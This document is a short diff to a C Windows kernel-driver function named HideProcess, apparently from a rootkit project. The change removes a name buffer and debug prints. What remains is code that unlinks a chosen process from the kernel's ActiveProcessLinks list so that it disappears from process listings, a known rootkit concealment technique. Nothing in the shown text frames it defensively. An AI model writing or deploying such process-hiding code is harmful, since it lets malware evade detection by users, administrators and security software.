@@ -34,13 +34,11 @@ VOID PrintAllProcesses()
 
 VOID HideProcess(DWORD32 pid)
 {
-	UCHAR name[15];
 	PEPROCESS p = PsGetCurrentProcess();
 	HANDLE currentPID = PsGetProcessId(p);
 	LIST_ENTRY process_flink;
 
 	do {
-		memcpy(name, ((char*)p + NameOffset), 15); // ImageFileName
 		memcpy(&process_flink, ((char*)p + ListEntryOffset), sizeof(LIST_ENTRY)); // ActiveProcessLinks
 		p = (PEPROCESS)((char*)process_flink.Flink - (char*)ListEntryOffset); // next process
 		currentPID = PsGetProcessId(p);
@@ -59,9 +57,7 @@ VOID HideProcess(DWORD32 pid)
 	PEPROCESS prev_p = (PEPROCESS)((char*)process_flink.Flink - (char*)ListEntryOffset);
 
 	char* prev_p_flink = (char*)prev_p + ListEntryOffset;
-	DbgPrint("%p\n", prev_p_flink);
 	memcpy(prev_p_flink, (char*)next_p + ListEntryOffset, sizeof(LIST_ENTRY));
-	DbgPrint("%p\n", prev_p_flink);
 	memcpy((char*)next_p + ListEntryOffset + 0x8, prev_p_flink, sizeof(LIST_ENTRY));
 }
 
